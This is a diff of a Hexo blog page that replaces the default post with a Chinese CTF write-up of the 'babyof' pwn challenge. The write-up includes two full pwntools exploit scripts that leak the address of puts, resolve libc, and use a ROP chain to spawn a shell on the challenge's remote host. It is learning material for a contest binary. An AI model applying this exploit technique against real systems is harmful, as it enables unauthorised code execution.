@@ -6,19 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hello World | Detective_LFY&#39;s Blog</title>
+  <title>NSSCTF中收录的【2021 鹤城杯】babyof题解 | Detective_LFY&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="0.前言这题是一个比较典型的栈溢出类题，整体思路不难，我查了一下好像是当时比赛的第二题。这题在NSSCTF上做的时候有一个点比较坑（后面讲），我不清楚是当时比赛环境就是这样还是收入时环境没有完全一致。不过还是解决了就是。写这题的wp的原因有几个：一是我认为这题解法比较经典，能起到一个复习的作用；二是这题会涉及一些我之前博客中忘了写的东西，相当于做一个补充；三是解决那个小问题时用到了LibcSear">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2021/09/20/hello-world/index.html">
+<meta property="og:title" content="NSSCTF中收录的【2021 鹤城杯】babyof题解">
+<meta property="og:url" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Detective_LFY&#39;s Blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="0.前言这题是一个比较典型的栈溢出类题，整体思路不难，我查了一下好像是当时比赛的第二题。这题在NSSCTF上做的时候有一个点比较坑（后面讲），我不清楚是当时比赛环境就是这样还是收入时环境没有完全一致。不过还是解决了就是。写这题的wp的原因有几个：一是我认为这题解法比较经典，能起到一个复习的作用；二是这题会涉及一些我之前博客中忘了写的东西，相当于做一个补充；三是解决那个小问题时用到了LibcSear">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-09-20T06:21:13.059Z">
-<meta property="article:modified_time" content="2021-09-20T06:21:13.059Z">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/1.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/2.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/3.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/4.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/5.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/6.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/7.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/8.png">
+<meta property="og:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/9.png">
+<meta property="article:published_time" content="2021-10-28T08:21:38.000Z">
+<meta property="article:modified_time" content="2021-10-28T09:32:05.242Z">
 <meta property="article:author" content="LianFeiyang">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="真题">
+<meta property="article:tag" content="libc">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Detective_LFY&#39;s Blog" type="application/atom+xml">
   
@@ -155,39 +169,35 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-NSSCTF中收录的【2021-鹤城杯】babyof题解" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      NSSCTF中收录的【2021 鹤城杯】babyof题解
     </h1>
   
 
         
-        <a href="/2021/09/20/hello-world/" class="archive-article-date">
-  	<time datetime="2021-09-20T06:21:13.059Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-20</time>
+        <a href="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/" class="archive-article-date">
+  	<time datetime="2021-10-28T08:21:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>这题是一个比较典型的栈溢出类题，整体思路不难，我查了一下好像是当时比赛的第二题。<br>这题在NSSCTF上做的时候有一个点比较坑（后面讲），我不清楚是当时比赛环境就是这样还是收入时环境没有完全一致。不过还是解决了就是。<br>写这题的wp的原因有几个：<br><em>一是我认为这题解法比较经典，能起到一个复习的作用；</em><br><em>二是这题会涉及一些我之前博客中忘了写的东西，相当于做一个补充；</em><br><em>三是解决那个小问题时用到了LibcSearcher，我个人觉得这是个不错且简单好用的Python库，一并说了。</em><br>这道题的exp优化参考了一些wp，但主体逻辑还是我自己写的。</p>
+<h4 id="1-题解过程"><a href="#1-题解过程" class="headerlink" title="1.题解过程"></a>1.题解过程</h4><span id="more"></span>
+<p>这题我会写的较为详细一些。<br>首先拿到ELF文件老规矩，先checksec一下，结果如下图所示：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/1.png"><br>可以看到开了NX保护，所以shellcode先别想了。<br>再尝试交互一下，发现只要一个可输入的地方，如图：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/2.png"><br>再老规矩丢到IDA里看看，发现主函数中只有一个主逻辑的函数，<strong>改名为mian_func()便于辨认。</strong><br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/3.png"><br>查看这个函数，发现存在明显的栈溢出：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/4.png"><br>由于溢出字节足够，不考虑栈转移。<br>再进一步查看发现IDA中找不到与libc相关的函数的地址，由此推测开了ASLR保护。<br>又由于main_func()中调用了两次puts函数：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/5.png"><br>因此可考虑泄露puts函数的地址，由此获取libc的基地址，进而获取system函数的基地址。<br>用ropper查找可用的gadgets，锁定了两个目标：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/6.png"><br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/7.png"></p>
+<p>那么总体的思路就很简单了：先通过栈溢出泄露system函数的地址和/bin/sh的地址，然后返回主函数起始位置，再通过栈溢出构建rop达成执行system(“/bin/sh”)的效果。<br>因此我最先的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./babyof&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400743</span></span><br><span class="line">ret=<span class="number">0x400506</span></span><br><span class="line">main_start=<span class="number">0x40066B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">64</span>+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(main_start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;win\n&#x27;</span>)    <span class="comment">#这边的\n不能漏。</span></span><br><span class="line">leak=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base=leak-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">64</span>+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>这种exp很遗憾，我只能在本地打通，如果是远程则会报如下错误：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/8.png"><br><strong>那么，这是为什么呢？</strong><br><strong>按道理说，靶机是Ubuntu18，我用的也是Ubuntu18，题目没有特别说明，那应该是默认2.27版本的libc没错。那么为什么会到最后一步出错？</strong><br><strong>是因为payload写错了？还是本身逻辑的问题？……这个问题我当时想了有些久。</strong><br><strong>然后，我注意到了一件事：k: not found，这个奇怪的k是哪里冒出来的？我当时突然意识到了一个东西，于是将binsh_addr做了一些偏移，然后发现返回的都是xxx : not found的这种格式，但xxx各不相同。</strong><br><strong>于是我猜测：会不会是这个binsh_addr本身就是一个错误的地址？如果是这样的话，那就是libc的问题了。</strong><br>于是我用了LibcSearcher，因为这样搜索出来的一定是靶机上的libc，新的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./babyof&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400743</span></span><br><span class="line">ret=<span class="number">0x400506</span></span><br><span class="line">main_start=<span class="number">0x40066B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">64</span>+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(main_start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;win\n&#x27;</span>)</span><br><span class="line">leak=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,leak)    <span class="comment">#根据已泄露的函数的实际地址寻找libc版本。</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base=leak-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">64</span>+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>然后，果然，靶机用的是<strong>libc6</strong>。<br>选择了正确的libc版本后就可以正常getshell了：<br><img src="/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/9.png"></p>
+<h4 id="2-结语"><a href="#2-结语" class="headerlink" title="2.结语"></a>2.结语</h4><p>这题其实也没什么很难的地方，算是补充了一下之前libc地址泄露的例题没法写出的遗憾吧。<br>也做了一些题目，发现栈类的题最搞人心态的应该就是libc和寄存器的问题吧……</p>
 
       
 
@@ -217,7 +227,41 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">真题</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">libc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/学习//" class="article-tag-list-link color3">学习</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
 
@@ -267,7 +311,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/20/hello-world/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/28/NSSCTF%E4%B8%AD%E6%94%B6%E5%BD%95%E7%9A%84%E3%80%902021-%E9%B9%A4%E5%9F%8E%E6%9D%AF%E3%80%91babyof%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -281,15 +325,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/09/20/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          测试文章
-        
-      </div>
-    </a>
   
+    <a href="/2021/10/26/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E9%A2%98%E7%9A%84%E4%B8%80%E8%88%AC%E6%96%B9%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">栈溢出类题的一般方法</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
